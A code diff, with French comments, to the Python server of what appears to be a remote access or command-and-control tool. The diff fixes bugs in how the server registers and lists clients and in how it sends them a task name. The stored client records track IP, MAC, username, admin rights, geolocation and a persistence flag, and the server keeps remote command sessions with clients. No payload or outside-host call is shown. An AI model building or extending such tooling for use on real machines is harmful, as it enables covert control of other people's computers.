@@ -127,10 +127,11 @@ def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, archi
     i = 1
     nom_fichier = "client"
     while nom_fichier == "client":
-        if os.path.exists("client" + str(i) + extDb):
+        print("client" + str(i) + extDb)
+        if os.path.exists(pathDb + "client" + str(i) + extDb):
             print("le fichier existe")
         else:
-            print("le fichier " + "client" + str(i) + " n'existe pas")
+            print("le fichier " + "client" + str(i) + extDb + " n'existe pas")
             nom_fichier = "client" + str(i)
         i = i + 1
     fichier = open(pathDb + nom_fichier + extDb, "w")
@@ -264,9 +265,10 @@ def CountClients(path):
 def AfficherClients(path): 
     list_dir = []
     list_dir = os.listdir(path)
-    for file in list_dir:
-        if file.endswith(extDb): # eg: '.txt'
-            fileName, fileExtension = os.path.splitext(file)
+    print("\n\t\tListe clients :")
+    for files in list_dir:
+        if files.endswith(extDb): # eg: '.txt'
+            fileName, fileExtension = os.path.splitext(files)
             with open(pathDb + fileName + fileExtension, "r") as file:
 
                 data = json.load(file)
@@ -284,7 +286,6 @@ def AfficherClients(path):
                 persistance = data["persistance"]
                 name_task = data["name_task"]
                 file.close()
-                print("\n\t\tListe clients :")
                 print("\nNumero Client : %s\n\tPlatform : %s\
                 \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
                 \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s\
@@ -353,7 +354,10 @@ class Server:
             id_conn = DefinirIdConn(mac_address)
             #print("Nouveau id : " + str(id_conn))
             ## envoi le nom de la tache si elle existe
-            message = ReturnInfo(mac_address, "name_task")
+            if ReturnInfo(mac_address, "name_task") != None:
+                message = ReturnInfo(mac_address, "name_task")
+            else:
+                message = "RAS"
             connection.sendall(str.encode(message))
 
         exit = False
@@ -376,7 +380,7 @@ class Server:
                                 if cmd == "exit":
                                     self.local = True
                                     self.ordre = ""
-                                    self.current_sessions = 0
+                                    self.current_sessions = 0 
                                     #print(str(self.local) + str(self.current_sessions) + self.ordre)
                                     #print("Fermeture de la session : " + str(id_conn))
                                     break
